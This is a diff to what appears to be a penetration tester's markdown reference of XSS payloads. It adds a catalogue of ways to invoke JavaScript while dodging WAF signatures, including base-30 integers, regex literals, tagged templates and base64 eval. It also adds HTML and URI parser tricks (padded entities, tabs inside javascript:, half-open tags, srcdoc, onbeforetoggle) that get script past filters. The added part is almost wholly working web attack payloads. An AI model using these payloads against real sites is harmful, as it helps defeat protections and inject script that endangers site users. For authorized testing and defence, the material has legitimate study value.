@@ -4,7 +4,7 @@ type: payloads
 tags: [payloads, xss, web, client-side]
 sources: []
 date_created: 2026-06-05
-date_updated: 2026-07-21
+date_updated: 2026-11-09
 ---
 
 # Payloads: XSS
@@ -108,6 +108,32 @@ grep -a 'your-unique-path' /tmp/net.json      # a request = the JS ran
 Payload: `onload=fetch('/<unique-canary-path>')`. The path exists nowhere on the target, so a
 request to it can only come from injected script. Use a REAL browser UA - the default
 headless UA is commonly served a CDN block page, which silently invalidates the test.
+
+### Never send `alert(` verbatim (JS-context gadget invocation)
+
+Most WAF signatures key on the literal call. Invocation families, weakest
+first (full catalogue: `skills/exploit/hunt/hunt-xss/references/waf-bypass.md`):
+
+```js
+(alert)(document.domain)                        // paren-wrap
+top[8680439..toString(30)](top)                 // base-30 int == "alert"
+top[/alert/.source](document.domain)            // regex literal builds the string
+[document.domain].find(alert)                   // array callback, no call syntax
+onerror=alert;throw document.domain             // no parens at all
+setTimeout`alert(document.domain)`    // tagged template = call
+eval(atob(/YWxlcnQo.../.source))                // base64 via regex literal
+```
+
+### Scheme + parser tricks that still land 2025-2026
+
+```
+<a href="jav&#x09;ascript:alert(1)">click</a>   tab/LF/CR inside javascript:
+<a href="&#0000106&#0000097&#0000118...">       entities, NO semicolons, 7-digit padded
+<IMG SRC="javascript:alert(1)"                  half-open tag: no closing > kills the
+                                                `=((%3D))...<...>` regex class
+<iframe srcdoc='&lt;img src=x onerror=...&gt;'> whole payload as entities
+<x onbeforetoggle=alert(1)><details open>       2025+ handler, rarely blocklisted
+```
 
 ## CSP bypass leads
 ```
